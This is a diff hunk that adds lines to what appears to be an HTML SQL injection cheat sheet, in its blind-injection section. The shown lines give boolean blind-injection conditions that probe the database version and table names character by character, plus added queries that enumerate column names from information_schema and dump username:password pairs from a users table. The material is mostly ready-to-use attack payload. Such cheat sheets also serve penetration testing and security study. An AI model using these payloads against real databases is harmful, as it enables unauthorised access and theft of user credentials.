@@ -91,6 +91,11 @@ and ascii(substring(version(),2,1)) = 48 -> Second Character<br>
 
 <b>Table</b><br>
 and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100<br>
+<b>Column Name</b><br>
+select column_name from information_schema.columns where table_name='' limit 0,1<br>
+<b>Data From Column</b><br>
+select concat(username,0x3a,password) from users limit 0,1<br>
+<i>Change value between {} of limit {0},1</i><br> 
 
 <h2>Time Based Blind</h2>
 <b>Intro</b>
